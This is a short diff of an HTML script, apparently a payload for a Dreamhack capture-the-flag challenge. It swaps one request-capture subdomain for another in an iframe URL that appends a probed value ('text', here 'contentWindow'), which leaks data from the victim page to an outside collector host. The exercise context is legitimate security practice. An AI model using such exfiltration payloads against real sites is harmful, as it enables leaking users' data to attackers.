@@ -12,7 +12,7 @@
                         text = "contentWindow"
                     }
                 
-                  iframe.src = "https://syleaie.request.dreamhack.games/" + text
+                  iframe.src = "https://gjiuwez.request.dreamhack.games/" + text
                   document.body.append(iframe)
               }
           </script>
